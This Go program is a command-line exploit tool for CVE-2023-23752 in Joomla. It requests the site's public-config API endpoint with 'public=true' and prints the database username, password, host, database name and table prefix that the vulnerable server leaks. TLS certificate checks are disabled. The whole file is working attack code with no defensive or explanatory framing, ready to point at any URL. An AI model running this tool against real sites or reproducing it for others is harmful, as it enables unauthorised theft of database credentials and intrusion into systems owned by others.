package main

import (
	"crypto/tls"
	"fmt"
	"html"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/Jeffail/gabs/v2"
	"github.com/akamensky/argparse"
	"github.com/vafakaramzadegan/urlparser"
)

func main() {
	banner := "\n    _           _         _         \n    /_  /_ _  / | _  _  /_/_  _  _ \n (_//_// // //_.'/_//_'/ // //_// /\nCVE-2023-23752 Data Extractor v0.1\n"
	parser := argparse.NewParser("CVE-2023-23752", banner)
	url := parser.String("u", "url", &argparse.Options{Required: true, Help: "Url to retrive data. Ex http://examble.com or http://examble.com/joomla-path"})
	payload := parser.Selector("t", "type", []string{"1", "2"}, &argparse.Options{Required: false, Default: "1", Help: "Select 1 for api/index.php/v1/config/application or 2 for api/v1/config/application"})
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
	}
	parserurl, _ := urlparser.Setup()
	parsed := parserurl.Parse(*url)
	var payuse string
	if *payload == "1" {
		payuse = "/api/index.php/v1/config/application?public=true&page[limit]=1000"
	} else if *payload == "2" {
		payuse = "/api/v1/config/application?public=true&page[limit]=1000"
	} else {
		payuse = "/api/index.php/v1/config/application?public=true&page[limit]=1000"
	}
	//	log.Print(*payload)
	//	log.Print(payuse)
	urldef := parsed.Scheme + "://"
	if parsed.Subdomain != "" {
		urldef = urldef + parsed.Subdomain + "."
	}
	urldef = urldef + parsed.Domain + "." + parsed.Suffix
	if parsed.Port != "" {
		urldef = urldef + ":" + parsed.Port
	}
	if parsed.Path != "" {
		urldef = urldef + strings.TrimSuffix(parsed.Path, "/")
	}
	urldef = urldef + payuse
	//	log.Print(urldef)
	if *url != "" {
		getuser(urldef)
	}
}

func getuser(url string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	banner := "\n    _           _         _         \n    /_  /_ _  / | _  _  /_/_  _  _ \n (_//_// // //_.'/_//_'/ // //_// /\nCVE-2023-23752 Data Extractor v0.1\n\n"
	client := &http.Client{}
	req, err := http.NewRequest("GET", html.EscapeString(url), nil)
	req.Header.Add("Accept", "*/*")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")
	risposta, err := client.Do(req)

	if err != nil {
		log.Fatal(err)
	} else {
		body, err := io.ReadAll(risposta.Body)
		jsonParsed, err := gabs.ParseJSON(body)
		if err != nil {
			fmt.Print(banner)
			fmt.Print("ERROR: Not Vulnerable or JSON not received")
			//			fmt.Print(err)
		} else {
			fmt.Print(banner)
			for _, child := range jsonParsed.S("data").Children() {
				for key, child2 := range child.S("attributes").ChildrenMap() {
					if key == "user" {
						fmt.Printf("%v: %v\n", key, child2.Data())
					}
					if key == "password" {
						fmt.Printf("%v: %v\n", key, child2.Data())
					}
					if key == "host" {
						fmt.Printf("%v: %v\n", key, child2.Data())
					}
					if key == "db" {
						fmt.Printf("%v: %v\n", key, child2.Data())
					}
					if key == "dbprefix" {
						fmt.Printf("%v: %v\n", key, child2.Data())
					}
				}

			}
		}
	}
}
